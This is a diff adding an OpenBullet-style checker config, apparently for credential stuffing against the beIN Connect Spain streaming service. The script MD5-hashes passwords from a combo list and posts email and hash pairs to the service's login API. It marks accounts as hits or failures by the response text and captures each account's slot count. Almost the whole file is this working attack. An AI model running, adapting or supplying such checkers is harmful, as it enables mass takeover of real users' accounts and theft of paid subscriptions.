@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "bein_CONNECT_ES",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T05:21:07.0153023+07:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HASH FUNCTION Hash MD5 "<PASS>" -> VAR "HASH" 
+#HASH REQUEST POST "https://example.com" AutoRedirect=TRUE 
+  CONTENT "<PASS>" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+FUNCTION ToLowercase "<HASH>" -> VAR "hash" 
+REQUEST POST "https://core.beinconnect.es/api/v3/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<hash>\",\"deviceId\":\"<hash>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "success\":{\"uuid\":" 
+  KEYCHAIN Failure OR 
+    KEY "Inactive user." 
+    KEY "{\"error\":\"Invalid email or password.\"}" 
+PARSE "<SOURCE>" LR "slots\":" "," Recursive=FALSE -> CAP "Slots" "" "" 
